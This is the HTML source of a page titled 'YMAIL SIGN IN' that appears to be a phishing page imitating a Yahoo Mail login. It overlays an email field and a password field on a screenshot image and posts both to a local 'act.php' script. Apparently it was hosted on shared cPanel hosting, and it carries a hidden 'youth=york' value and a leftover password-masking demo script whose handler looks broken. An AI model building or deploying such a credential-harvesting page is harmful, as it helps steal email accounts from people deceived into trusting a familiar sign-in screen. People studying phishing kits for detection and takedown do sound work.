

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0014)about:internet -->
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name = "viewport" content = "user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
<meta name="apple-mobile-web-app-capable" content="yes" />
<title>YMAIL SIGN IN</title>
<meta name="GENERATOR" content="DUDU">
<meta name="DUDU" content="DUDU">
<style type="text/css">
body
{
   background-color: #fff;
   color: #000000;
   overflow-x: hidden;
}

.y_input{ position:absolute;left:42px;top:162px;width:290px;height:33px;border:0;border-bottom:1px #848484 solid;font-family:Arial;font-size:16px;z-index:0}
.y_input:hover
{
   border-bottom:2px #0080FF solid;
}

.k_input{ position:absolute;left:42px;top:218px;width:290px;height:33px;border:0;border-bottom:1px #848484 solid;font-family:Arial;font-size:16px;z-index:1}
.k_input:hover
{
   border-bottom:2px #0080FF solid;
}
</style>
<style type="text/css">
a:hover
{
   color: #6CDA7B;
}
</style>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:398px;height:561px;text-align:left;z-index:3;">
<img src="images_files/we_s05_ym.png" id="Image1" alt="" width="380" height="531" align="top" border="0"></div>

<div id="bvForm1" style="position:absolute;left:0px;top:0px;width:401px;height:500px;z-index:4">
<form name="Formv1" method="post" id="demo-form" action="act.php">
<input type="hidden" name="youth" value="york">
<input id="email" class="y_input" name="emazz" value="" type="text" required placeholder="Username or email">

<input class="k_input" name="pswdd" value="" type="password" id="demo-field" required placeholder="Password">


<input id="Button1" name="Button1" value="" style="position:absolute;left:38px;top:260px;width:255.5px;height:62px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2" type="submit">
</form>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>

</body><script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'}),_trfd.push({'ap':'cpsh'},{'server':'p3plcpnl0778'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/tcc/tcc_l.combined.1.0.6.min.js'></script></html>